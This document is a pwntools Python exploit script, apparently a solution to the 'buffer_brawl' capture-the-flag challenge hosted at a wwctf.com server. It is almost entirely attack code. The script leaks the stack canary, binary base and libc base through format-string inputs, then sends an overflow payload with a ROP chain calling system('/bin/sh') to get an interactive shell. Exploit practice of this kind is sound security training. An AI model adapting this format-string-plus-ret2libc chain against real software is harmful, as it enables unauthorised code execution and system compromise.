#!/usr/bin/env python3
from pwn import *

exe = ELF("./buffer_brawl_patched")
libc = ELF("./libc.so.6")

context.binary = exe
def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("buffer-brawl.chal.wwctf.com", 1337)

    return r
def main():
	r = conn()
	input()
	def throwJab():
		r.sendlineafter(b'> ', b'1')
	def throwHook():
		r.sendlineafter(b'> ', b'2')
	def throwUppercut():
		r.sendlineafter(b'> ', b'3')
	def slip(data):
		r.sendlineafter(b'> ', b'4')
		r.recvuntil(b'Right or left?\n')
		r.sendline(data)
	def TKO():
		pass
	# Leak canary
	
	slip(b'%11$p')
	canary = int(r.recv(18), 16)
	info(b'Canary found: ' + hex(canary).encode())
	# Leak binary address 
	slip(b'%8$p')
	exe_leak = int(r.recv(14), 16)
	exe.address = exe_leak - 0x24e0
	info('Exe leak: ' + hex(exe_leak))
	info('Exe address: ' + hex(exe.address))
	# Leak libc address 
	slip(b'%7$s\0\0\0\0' + p64(exe.address + 0x3fb8))
	libc_leak = u64(r.recv(6) + b'\0\0')
	info(b'Libc leak: ' + hex(libc_leak).encode())
	libc.address = libc_leak - libc.sym['read']
	info(b'Libc base address: ' + hex(libc.address).encode())
	pause()
	bin_sh = next(libc.search('/bin/sh'))
	ret = libc.address +  0x0f8c92
	system = libc.sym['system']
	for i in range(29):
		throwUppercut()
	poprdi = libc.address + 0x2a3e5
	ret = poprdi + 1
	payload = b'A' * 24
	payload += p64(canary)
	payload += b"B" * 8
	payload += p64(poprdi) # pop rdi
	payload += p64(bin_sh) # "/bin/sh"
	payload += p64(ret) # ret;
	payload += p64(system) # system()
	r.sendlineafter(b'Enter your move: \n', payload) 
	# pause()
	r.interactive()

if __name__ == "__main__":
    main() 